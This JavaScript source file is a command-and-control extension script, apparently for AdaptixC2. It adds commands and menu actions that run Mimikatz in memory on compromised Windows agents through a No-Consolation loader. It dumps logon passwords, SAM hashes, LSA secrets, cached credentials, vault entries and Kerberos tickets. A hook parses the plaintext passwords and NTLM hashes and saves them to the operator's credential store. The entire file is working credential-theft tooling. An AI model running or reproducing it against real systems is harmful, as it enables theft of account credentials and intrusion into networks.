function mimikatz_arch(id) {
    if (!ax.is64(id)) {
        throw new Error("Mimikatz via No-Consolation requires a 64-bit agent; the current agent is 32-bit/WoW64.");
    }
    let arch = ax.arch(id);
    if (arch === "x32" || arch === "x86") {
        return "x86";
    }
    if (arch === "x64") {
        return "x64";
    }
    throw new Error("Unsupported agent architecture for Mimikatz: " + arch);
}

function mimikatz_first_existing(paths) {
    for (let i = 0; i < paths.length; i++) {
        if (ax.file_exists(paths[i])) {
            return paths[i];
        }
    }
    return "";
}

function mimikatz_pe_path(id) {
    let arch = mimikatz_arch(id);
    return mimikatz_first_existing([
        ax.script_dir() + "mimikatz/_bin/mimikatz." + arch + ".exe",
        ax.script_dir() + "_bin/mimikatz." + arch + ".exe"
    ]);
}

function mimikatz_bof_path(id) {
    let arch = mimikatz_arch(id);
    let alts = (arch === "x86") ? ["x86", "x32"] : [arch];
    let bases = [
        ax.script_dir() + "../Execution-BOF/_bin/NoConsolation.",
        ax.script_dir() + "../Execution-BOF/No-Consolation/_bin/NoConsolation.",
        ax.script_dir() + "_bin/NoConsolation."
    ];
    for (let b = 0; b < bases.length; b++) {
        for (let a = 0; a < alts.length; a++) {
            let p = bases[b] + alts[a] + ".o";
            if (ax.file_exists(p)) {
                return p;
            }
        }
    }
    throw new Error(
        "No-Consolation loader for " + arch + " is missing. Build it with " +
        "make -C Extension-Kit/Execution-BOF, then reload the Creds-BOF AxScript."
    );
}

function mimikatz_ensure_exit(modules) {
    if (/\bexit\b/i.test(modules)) {
        return modules;
    }
    return modules.replace(/\s+$/, "") + " exit";
}

function mimikatz_timeout(value) {
    let timeout = Number(value);
    if (!isFinite(timeout) || timeout % 1 !== 0 || timeout < 0 || timeout > 900) {
        throw new Error("--timeout must be an integer from 0 to 900 seconds (0 disables the wait).");
    }
    return timeout;
}

function mimikatz_cred_hook() {
    let accumulated = "";
    let seen = {};

    return function (task) {
        if (task.text) {
            accumulated += task.text;
        }

        let agents = ax.agents();
        let agent = agents[task.agent];
        if (!agent) {
            return task;
        }
        let host = agent["computer"] + " (" + agent["internal_ip"] + ")";

        let blocks = accumulated.split(/\* Username\s*:/i);
        for (let i = 1; i < blocks.length; i++) {
            let block = blocks[i];
            let userMatch = block.match(/^\s*([^\r\n]+)/);
            let user = userMatch ? userMatch[1].trim() : "";
            let domainMatch = block.match(/\* Domain\s*:\s*([^\r\n]+)/i);
            let domain = domainMatch ? domainMatch[1].trim() : "";
            let ntlmMatch = block.match(/\* NTLM\s*:\s*([a-fA-F0-9]{32})/i);
            let ntlm = ntlmMatch ? ntlmMatch[1] : "";
            let passMatch = block.match(/\* Password\s*:\s*([^\r\n]+)/i);
            let password = passMatch ? passMatch[1].trim() : "";

            if (!user || user === "(null)" || user === "N/A") {
                continue;
            }
            if (password && password !== "(null)" && password.indexOf("n.s.") !== 0) {
                let key = user + "|" + domain + "|pw|" + password;
                if (!seen[key]) {
                    seen[key] = true;
                    ax.credentials_add(user, password, domain, "plaintext", "", "Mimikatz", host);
                }
            }
            if (ntlm) {
                let key = user + "|" + domain + "|ntlm|" + ntlm;
                if (!seen[key]) {
                    seen[key] = true;
                    ax.credentials_add(user, ntlm, domain, "ntlm", "", "Mimikatz", host);
                }
            }
        }

        let samRe = /User\s*:\s*([^\r\n]+)\r?\n\s*Hash NTLM:\s*([a-fA-F0-9]{32})/gi;
        let samMatch;
        while ((samMatch = samRe.exec(accumulated)) !== null) {
            let user = samMatch[1].trim();
            let ntlm = samMatch[2];
            let key = user + "||sam|" + ntlm;
            if (!seen[key]) {
                seen[key] = true;
                ax.credentials_add(user, ntlm, "", "ntlm", "", "Mimikatz SAM", host);
            }
        }

        return task;
    };
}

function mimikatz_from_modules(id, cmdline, modules, timeout, dont_save, headers, pe_override) {
    let pebytes = pe_override || "";
    if (!pebytes) {
        let pe_path = mimikatz_pe_path(id);
        if (!pe_path) {
            throw new Error("mimikatz." + mimikatz_arch(id) + ".exe not found. On the teamserver run: bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh, then reload the Creds-BOF AxScript.");
        }
        pebytes = ax.file_read(pe_path);
    }
    mimikatz_execute(id, cmdline, pebytes, modules, timeout, dont_save, headers);
}

function mimikatz_execute(id, cmdline, pebytes, modules, timeout, dont_save, headers) {
    if (!pebytes || pebytes.length === 0) {
        throw new Error("Mimikatz PE could not be read. Run Creds-BOF/mimikatz/fetch_mimikatz.sh on the teamserver and ensure the Creds-BOF directory is in the AxScript sandbox roots.");
    }

    let bof_path = mimikatz_bof_path(id);
    let pename = ax.hash("md5", pebytes, 8) + ".exe";
    let pepath = "C:\\Windows\\System32\\" + pename;
    let pecmdline = pename + " " + modules;
    let timestamp = ax.format_time("dd/MM hh:mm", ax.ticks());

    let bof_params = ax.bof_pack(
        "wstr,cstr,wstr,bytes,cstr,int,int,int,wstr,cstr,wstr,int,int,int,int,cstr,int,int,cstr,cstr,int,int,int,cstr,cstr,cstr,int",
        [
            pename, pename, pepath, pebytes, "",
            0, timeout, headers,
            pecmdline, pecmdline, "",
            0, 0, 0, 0, "",
            dont_save, 0, "", timestamp,
            0, 0, 0, "", "", "", 0
        ]
    );

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Mimikatz (No-Consolation)", mimikatz_cred_hook());
}

var cmd_mimikatz = ax.create_command(
    "mimikatz",
    "Run official Mimikatz in-memory (all modules: sekurlsa, lsadump, kerberos, vault, dpapi, token, privilege, crypto, ...)",
    "mimikatz privilege::debug sekurlsa::logonpasswords exit"
);
cmd_mimikatz.addArgFlagInt("--timeout", "timeout", false, "Seconds to wait for Mimikatz (default 120; 0 disables the wait)");
cmd_mimikatz.addArgFlagFile("-f", "BINARY", false, "Custom Mimikatz PE instead of the fetched official build");
cmd_mimikatz.addArgBool("--no-exit", "Do not append the Mimikatz exit command");
cmd_mimikatz.addArgBool("--dont-save", "Do not keep the PE cached in agent memory");
cmd_mimikatz.addArgBool("-k", "Overwrite PE headers after mapping");
cmd_mimikatz.addArgString("modules", false, "Mimikatz modules. Default: privilege::debug sekurlsa::logonpasswords");
cmd_mimikatz.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let modules = parsed_json["modules"] || "privilege::debug sekurlsa::logonpasswords";
    if (!parsed_json["--no-exit"]) {
        modules = mimikatz_ensure_exit(modules);
    }

    let timeout = 120;
    if ("timeout" in parsed_json) {
        timeout = mimikatz_timeout(parsed_json["timeout"]);
    }

    let pebytes = "";
    if ("BINARY" in parsed_json && parsed_json["BINARY"]) {
        pebytes = parsed_json["BINARY"];
    }

    let dont_save = parsed_json["--dont-save"] ? 1 : 0;
    let headers = parsed_json["-k"] ? 1 : 0;
    mimikatz_from_modules(id, cmdline, modules, timeout, dont_save, headers, pebytes);
});

// Cobalt Strike: bmimikatz_small($bid, "sekurlsa::logonpasswords")
var cmd_mimikatz_small = ax.create_command(
    "mimikatz_small",
    "CS-style bmimikatz_small: in-memory Mimikatz, default sekurlsa::logonpasswords",
    "mimikatz_small"
);
cmd_mimikatz_small.addArgFlagInt("--timeout", "timeout", false, "Seconds to wait (default 120; 0 disables the wait)");
cmd_mimikatz_small.addArgString("modules", false, "Mimikatz modules. Default: privilege::debug sekurlsa::logonpasswords");
cmd_mimikatz_small.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let modules = mimikatz_ensure_exit(parsed_json["modules"] || "privilege::debug sekurlsa::logonpasswords");
    let timeout = ("timeout" in parsed_json) ? mimikatz_timeout(parsed_json["timeout"]) : 120;
    mimikatz_from_modules(id, cmdline, modules, timeout, 0, 0, "");
});

// Cobalt Strike aggressor alias: logonpasswords -> bmimikatz_small
var cmd_logonpasswords = ax.create_command(
    "logonpasswords",
    "CS-style logonpasswords (same as mimikatz_small / bmimikatz_small)",
    "logonpasswords"
);
cmd_logonpasswords.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    mimikatz_from_modules(id, cmdline, "privilege::debug sekurlsa::logonpasswords exit", 120, 0, 0, "");
});

var group_mimikatz = ax.create_commands_group("Mimikatz", [cmd_mimikatz, cmd_mimikatz_small, cmd_logonpasswords]);
ax.register_commands_group(group_mimikatz, ["beacon", "gopher", "kharon"], ["windows"], []);

function mimikatz_menu(title, command) {
    let action = menu.create_action(title, function (agents_id) {
        agents_id.forEach(function (id) { ax.execute_command(id, command); });
    });
    menu.add_session_access(action, ["beacon", "gopher", "kharon"], ["windows"]);
}

mimikatz_menu("Mimikatz: logonpasswords", "mimikatz privilege::debug sekurlsa::logonpasswords exit");
mimikatz_menu("Mimikatz: tickets", "mimikatz privilege::debug sekurlsa::tickets /export exit");
mimikatz_menu("Mimikatz: ekeys", "mimikatz privilege::debug sekurlsa::ekeys exit");
mimikatz_menu("Mimikatz: SAM", "mimikatz privilege::debug token::elevate lsadump::sam exit");
mimikatz_menu("Mimikatz: LSA secrets", "mimikatz privilege::debug token::elevate lsadump::secrets exit");
mimikatz_menu("Mimikatz: cache", "mimikatz privilege::debug token::elevate lsadump::cache exit");
mimikatz_menu("Mimikatz: vault", "mimikatz privilege::debug vault::cred vault::list exit");
mimikatz_menu("Mimikatz: coffee", "mimikatz coffee exit");
